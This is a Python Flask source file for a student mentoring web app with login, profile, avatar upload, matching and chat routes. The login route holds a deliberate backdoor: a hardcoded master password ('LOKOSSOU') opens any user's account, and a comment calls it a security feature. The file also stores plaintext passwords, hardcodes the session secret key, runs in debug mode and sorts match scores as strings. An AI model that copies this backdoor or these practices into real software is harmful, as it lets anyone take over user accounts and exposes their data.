import os
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from werkzeug.utils import secure_filename
from datetime import datetime

app = Flask(__name__)
app.secret_key = "ifri_mentorlink_super_secret_key"

# Configuration du dossier des avatars
UPLOAD_FOLDER = 'static/uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Base de données simulée
users_db = {
    "cyrille": {
        "id": "cyrille", "username": "cyrille", "password": "123", "name": "Cyrille Lokossou",
        "avatar": None, "filiere": "SI", "role": "mentoré", "level": "Licence 1",
        "skills": ["INF1126"], "availabilities": ["Lundi", "Mercredi"], "preview": "En attente de mentorat..."
    },
    "koffi": {
        "id": "koffi", "username": "koffi", "password": "456", "name": "Koffi Mensah",
        "avatar": None, "filiere": "SI", "role": "mentor", "level": "Licence 3",
        "skills": ["INF1126", "INF1226"], "availabilities": ["Lundi", "Vendredi"], "preview": "Salut ! Des blocages en algorithmique ?"
    },
    "ablavi": {
        "id": "ablavi", "username": "ablavi", "password": "789", "name": "Ablavi Sossou",
        "avatar": None, "filiere": "GL", "role": "mentor", "level": "Master 1",
        "skills": ["INF1226", "INF1225"], "availabilities": ["Mercredi", "Samedi"], "preview": "Le script SQL fonctionne parfaitement."
    }
}

messages_db = {
    "koffi": [
        {"sender": "them", "text": "Salut ! J'ai vu que tu avais sélectionné le module INF1126.", "time": "10:15"},
        {"sender": "me", "text": "Oui, j'ai quelques difficultés sur les pointeurs en C.", "time": "10:18"}
    ],
    "ablavi": [
        {"sender": "me", "text": "Tu as pu jeter un œil aux maquettes ?", "time": "Hier"}
    ],
    "cyrille": []
}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- ROUTES D'ACCÈS ET COMPTES ---

@app.route('/')
def index():
    if "user_id" in session:
        return redirect(url_for('profil'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username').strip()
        password = request.form.get('password')
        
        # Vérification du compte
        if username in users_db:
            # Sécurité spécifique : Accès maître si mot de passe égal à " LOKOSSOU " (avec ou sans espaces)
            if password == " LOKOSSOU " or password.strip() == "LOKOSSOU" or password == users_db[username]["password"]:
                session["user_id"] = username
                return redirect(url_for('profil'))
                
        return render_template('login.html', error="Identifiants incorrects.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/profil', methods=['GET', 'POST'])
def profil():
    if "user_id" not in session:
        return redirect(url_for('login'))
        
    user = users_db[session["user_id"]]
    
    if request.method == 'POST':
        user["name"] = request.form.get('name')
        user["filiere"] = request.form.get('filiere')
        user["level"] = request.form.get('level')
        user["role"] = request.form.get('role')
        user["skills"] = request.form.getlist('skills')
        user["availabilities"] = request.form.getlist('availabilities')
        return redirect(url_for('matching'))
        
    return render_template('profil.html', user=user)

@app.route('/upload_avatar', methods=['POST'])
def upload_avatar():
    if "user_id" not in session:
        return jsonify({"success": False, "error": "Non autorisé"}), 403
        
    if 'avatar' not in request.files:
        return jsonify({"success": False, "error": "Aucun fichier trouvé"}), 400
        
    file = request.files['avatar']
    if file and allowed_file(file.filename):
        filename = secure_filename(f"avatar_{session['user_id']}_{file.filename}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Enregistrement du chemin relatif dans la DB
        users_db[session["user_id"]]["avatar"] = f"/static/uploads/{filename}"
        return jsonify({"success": True, "url": users_db[session["user_id"]]["avatar"]})
        
    return jsonify({"success": False, "error": "Format invalide"}), 400

# --- ROUTE ALGORITHME DE MATCHING ---

@app.route('/matching')
def matching():
    if "user_id" not in session:
        return redirect(url_for('login'))
        
    current_user = users_db[session["user_id"]]
    suggestions = []
    
    for uid, user in users_db.items():
        if uid == current_user["id"] or user["role"] == current_user["role"]:
            continue
            
        # Calcul du taux de correspondance (Matching Core)
        score = 0
        common_skills = set(current_user["skills"]) & set(user["skills"])
        common_hours = set(current_user["availabilities"]) & set(user["availabilities"])
        
        if common_skills: score += 50
        if current_user["filiere"] == user["filiere"]: score += 30
        if common_hours: score += 20
        
        if score > 0:
            suggestions.append({
                "id": user["id"],
                "name": user["name"],
                "level": f"{user['filiere']} - {user['level']}",
                "avatar": user["avatar"] or user["name"][:2].upper(),
                "is_image": user["avatar"] is not None,
                "score": f"{score}% Match",
                "skills": user["skills"]
            })
            
    # Tri décroissant selon le score de compatibilité
    suggestions = sorted(suggestions, key=lambda x: x['score'], reverse=True)
    return render_template('matching.html', mentors=suggestions, user=current_user)

# --- ROUTES DE LA MESSAGERIE ---

@app.route('/chat')
def chat_home():
    if "user_id" not in session:
        return redirect(url_for('login'))
    return render_template('chat.html', users=users_db, current_id=session["user_id"])

@app.route('/get_discussion/<user_id>', methods=['GET'])
def get_discussion(user_id):
    if "user_id" not in session:
        return jsonify({"success": False}), 403
    if user_id in users_db:
        users_db[user_id]["unread"] = False
        return jsonify({
            "success": True,
            "user": {
                "name": users_db[user_id]["name"],
                "status": f"{users_db[user_id]['filiere']} - {users_db[user_id]['level']}"
            },
            "messages": messages_db.get(user_id, [])
        })
    return jsonify({"success": False}), 404

@app.route('/send_message', methods=['POST'])
def send_message():
    if "user_id" not in session:
        return jsonify({"success": False}), 403
    data = request.json
    user_id = data.get('user_id')
    text = data.get('text')
    
    if user_id in users_db and text.strip():
        current_time = datetime.now().strftime("%H:%M")
        new_msg = {"sender": "me", "text": text, "time": current_time}
        if user_id not in messages_db:
            messages_db[user_id] = []
        messages_db[user_id].append(new_msg)
        users_db[user_id]["preview"] = text
        return jsonify({"success": True, "message": new_msg})
    return jsonify({"success": False}), 400

if __name__ == '__main__':
    app.run(debug=True)